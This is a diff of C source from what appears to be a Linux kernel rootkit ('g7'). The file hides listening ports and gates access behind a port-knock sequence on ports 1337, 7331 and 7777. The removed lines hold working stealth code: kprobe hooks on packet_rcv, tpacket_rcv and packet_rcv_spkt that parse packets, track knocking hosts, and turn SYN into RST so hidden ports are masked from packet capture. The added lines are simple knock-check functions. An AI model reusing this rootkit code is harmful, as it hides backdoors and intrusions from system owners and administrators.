@@ -14,8 +14,7 @@
 #include "hook.h"
 #include "porthide.h"
 
-
-// stage 1: 1337
+// knock stage 1: 1337
 knock_list_t ips_stage1 = {
     .ip  = { 0 },
     .version = -1,
@@ -25,7 +24,7 @@ knock_list_t ips_stage1 = {
 
 knock_list_t_ptr ips_stage1_tail = &ips_stage1;
 
-// stage 2: 7331
+// knock stage 2: 7331
 knock_list_t ips_stage2 = {
     .ip  = { 0 },
     .version = -1,
@@ -35,7 +34,7 @@ knock_list_t ips_stage2 = {
 
 knock_list_t_ptr ips_stage2_tail = &ips_stage2;
 
-// stage 3: 7777
+// knock stage 3: 7777
 knock_list_t ips_stage3 = {
     .ip  = { 0 },
     .version = -1,
@@ -53,58 +52,6 @@ lport_list_t hidden_lports = {
 
 lport_list_t_ptr hidden_lports_tail = &hidden_lports;
 
-static int g7_packet_rcv(struct kprobe *, struct pt_regs *);
-static int g7_fault(struct kprobe *, struct pt_regs *, int);
-static void g7_post(struct kprobe *, struct pt_regs *m, unsigned long);
-
-// TODO store in array of kprobes
-static struct kprobe p_rcv = {
-    .symbol_name = "packet_rcv",
-};
-
-static struct kprobe tp_rcv = {
-    .symbol_name = "tpacket_rcv",
-};
-
-static struct kprobe p_rcv_spkt = {
-    .symbol_name = "packet_rcv_spkt",
-};
-
-void
-hide_lports(void)
-{
-    p_rcv.pre_handler = g7_packet_rcv;
-    p_rcv.post_handler = g7_post;
-    p_rcv.fault_handler = g7_fault;
-
-    tp_rcv.pre_handler = g7_packet_rcv;
-    tp_rcv.post_handler = g7_post;
-    tp_rcv.fault_handler = g7_fault;
-
-    p_rcv_spkt.pre_handler = g7_packet_rcv;
-    p_rcv_spkt.post_handler = g7_post;
-    p_rcv_spkt.fault_handler = g7_fault;
-
-    if (register_kprobe(&p_rcv))
-        DEBUG_INFO("[g7] Could not insert kprobe p_rcv\n");
-
-    if (register_kprobe(&tp_rcv))
-        DEBUG_INFO("[g7] Could not insert kprobe tp_rcv\n");
-
-    if (register_kprobe(&p_rcv_spkt))
-        DEBUG_INFO("[g7] Could not insert kprobe p_rcv_spkt\n");
-
-    hide_lport(8080);
-}
-
-void
-unhide_lports(void)
-{
-    unregister_kprobe(&p_rcv);
-    unregister_kprobe(&tp_rcv);
-    unregister_kprobe(&p_rcv_spkt);
-}
-
 void
 hide_lport(lport_t lport)
 {
@@ -118,99 +65,22 @@ unhide_lport(lport_t lport)
     remove_lport_from_list(hidden_lports_tail, lport);
 }
 
-static int
-g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
+bool
+stage1_knock(lport_t port)
 {
-    struct sk_buff *skb;
-    skb = (struct sk_buff *)pt_regs->di;
-
-    u8 protocol = 0;
-    u8 ip[16] = { 0 };
-    ip_version version;
-
-    char *data = skb_network_header(skb);
-    char ver = data[0];
-
-    ver &= 0xf0;
-
-    struct sk_buff *clone = skb_clone(skb, GFP_KERNEL);
-    pt_regs->di = (long unsigned int)clone;
-
-    if ((ver == 0x60)) {
-        struct ipv6hdr *iphdr;
-
-        iphdr = ipv6_hdr(clone);
-        protocol = iphdr->nexthdr;
-        version = v6;
-        memcpy(ip, (u8 *)&iphdr->daddr, 16);
-
-    } else if ((ver == 0x40)) {
-        struct iphdr *iphdr;
-
-        iphdr = ip_hdr(clone);
-        protocol = iphdr->protocol;
-        version = v4;
-        memcpy(ip, (u8 *)&iphdr->daddr, 4);
-
-    } else
-        return 0;
-
-    // We need to intercept (RST) the TCP handshake
-    if (protocol == IPPROTO_TCP) {
-        struct tcphdr *tcphdr;
-
-        tcphdr = (struct tcphdr *)skb_transport_header(skb);
-        unsigned src_port = (unsigned)ntohs(tcphdr->source);
-
-        if (list_contains_knock(&ips_stage3, ip, version))
-            return 0;
-
-        if (tcphdr->syn || !tcphdr->ack)
-            goto check_port;
-
-        if (list_contains_knock(&ips_stage2, ip, version)) {
-            if (src_port == 7777) {
-                DEBUG_NOTICE("[g7] knocked port %d, port knocking sequence completed\n", src_port);
-                add_knock_to_list(&ips_stage3_tail, ip, version);
-	    }
-
-            remove_knock_from_list(&ips_stage2, &ips_stage2_tail, ip, version);
-        } else if (list_contains_knock(&ips_stage1, ip, version)) {
-            if (src_port == 7331) {
-                add_knock_to_list(&ips_stage2_tail, ip, version);
-                DEBUG_NOTICE("[g7] knocked port %d, entering knocking stage 2\n", src_port);
-	    }
-
-            remove_knock_from_list(&ips_stage1, &ips_stage1_tail, ip, version);
-        } else {
-            if (src_port == 1337) {
-                DEBUG_NOTICE("[g7] knocked port %d, entering knocking stage 1\n", src_port);
-                add_knock_to_list(&ips_stage1_tail, ip, version);
-	    }
-        }
-
-check_port:
-        if (list_contains_lport(&hidden_lports, src_port))
-            if (tcphdr->syn) {
-                tcphdr->syn = 0;
-                tcphdr->ack = 0;
-                tcphdr->rst = 1;
-            }
-    }
-
-    return 0;
+    return port == 1337;
 }
 
-static void
-g7_post(struct kprobe *kp, struct pt_regs *pt_regs, unsigned long flags)
+bool
+stage2_knock(lport_t port)
 {
-    return;
+    return port == 7331;
 }
 
-static int
-g7_fault(struct kprobe *kp, struct pt_regs *pt_regs, int trapnr)
+bool
+stage3_knock(lport_t port)
 {
-    return 0;
+    return port == 7777;
 }
 
 void
